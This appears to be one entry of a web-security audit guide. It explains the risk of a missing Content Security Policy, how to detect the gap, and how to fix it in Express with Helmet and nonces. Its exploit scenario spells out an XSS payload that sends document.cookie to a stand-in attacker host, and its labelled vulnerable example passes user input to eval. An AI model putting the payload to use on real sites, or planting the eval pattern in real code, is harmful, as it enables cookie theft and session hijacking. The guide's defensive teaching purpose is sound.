# 29. Missing Content Security Policy (CSP)

## 🟠 Risk Level: **HIGH**

## 📋 Vulnerability Description

Applications rarely include Content Security Policy headers by default. Without a CSP, the browser will blindly execute any script it receives. This means if an attacker manages to inject a malicious script tag (XSS), the browser will run it, allowing cookie theft or session hijacking.

**Impact:**
- XSS attacks succeed
- Cookie theft
- Session hijacking
- Malicious script execution

## 🎯 Context: Why This Happens

AI-generated apps:
- Don't include CSP by default
- Focus on functionality
- Don't understand CSP importance

## 🔍 Detection Methods

### 1. Header Check

```bash
curl -I https://example.com | grep -i "content-security-policy"
# If missing → VULNERABLE
```

### 2. Browser DevTools

**Network tab → Response headers:**
- Check for `Content-Security-Policy` header

## ✅ Verification Requirements

### Must Have:
1. **CSP Header Set**
   - Restrictive policy
   - Whitelist trusted sources
   - Report violations

2. **Policy Configuration**
   - `default-src 'self'`
   - Specific sources for scripts, styles, images
   - No `unsafe-inline` or `unsafe-eval` if possible

## 🚨 Exploit Path

### Scenario 1: XSS Without CSP
```
1. Attacker injects: <script>fetch('evil.com?cookie='+document.cookie)</script>
2. Browser executes script
3. Cookie sent to attacker
4. Session hijacked
```

### Scenario 2: XSS With CSP
```
1. Attacker injects same script
2. CSP blocks execution
3. Attack fails
4. User protected
```

## 🔧 Remediation Steps

### Step 1: Configure CSP

**Express with Helmet:**
```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "https://trusted-cdn.com"],
    styleSrc: ["'self'", "'unsafe-inline'"], // Inline styles allowed
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    upgradeInsecureRequests: [],
  },
  reportOnly: false // Enforce, don't just report
}));
```

**Manual CSP:**
```javascript
app.use((req, res, next) => {
  const csp = [
    "default-src 'self'",
    "script-src 'self' https://trusted-cdn.com",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "connect-src 'self'",
    "font-src 'self'",
    "object-src 'none'",
    "frame-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "upgrade-insecure-requests"
  ].join('; ');
  
  res.setHeader('Content-Security-Policy', csp);
  next();
});
```

### Step 2: Use Nonces for Inline Scripts

```javascript
const crypto = require('crypto');

app.use((req, res, next) => {
  // Generate nonce for this request
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  
  const csp = [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${res.locals.nonce}'`,
    `style-src 'self' 'unsafe-inline'`
  ].join('; ');
  
  res.setHeader('Content-Security-Policy', csp);
  next();
});

// In template
<script nonce="<%= nonce %>">
  // Inline script with nonce
</script>
```

### Step 3: Report Violations

```javascript
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    reportUri: '/api/csp-report' // Report violations
  }
}));

// CSP report endpoint
app.post('/api/csp-report', express.json(), (req, res) => {
  // Log CSP violations
  console.warn('CSP Violation:', req.body);
  res.status(204).send();
});
```

## 📝 Code Examples

### ❌ Vulnerable

```javascript
// ❌ VULNERABLE: No CSP
app.get('/', (req, res) => {
  res.send(`
    <html>
      <script>
        // Any script can execute
        eval(userInput); // ❌ Dangerous
      </script>
    </html>
  `);
});
```

### ✅ Secure

```javascript
// ✅ SECURE: CSP enabled
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"], // Blocks inline scripts
    styleSrc: ["'self'", "'unsafe-inline'"]
  }
}));

app.get('/', (req, res) => {
  res.send(`
    <html>
      <script>
        // This would be blocked by CSP
        // Must use external script or nonce
      </script>
      <script src="/static/app.js"></script>
    </html>
  `);
});
```

## 🧪 Testing Checklist

- [ ] CSP header present
- [ ] Restrictive policy configured
- [ ] No unsafe-inline for scripts (if possible)
- [ ] No unsafe-eval
- [ ] Trusted sources whitelisted
- [ ] Violations reported
- [ ] Policy tested in browser

## 📚 References

- [OWASP: Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [MDN: CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

## 🔗 Related Vulnerabilities

- [39. Unsanitized DOM Injection](../input_validation/39_unsanitized_dom_injection.md)
- [17. Missing HTTP Security Headers](./17_missing_security_headers.md)

---

**Classification**:
- **Confirmed** if no CSP header present
- **Likely** if CSP too permissive (unsafe-inline, *)
- **Not Applicable** if restrictive CSP properly configured
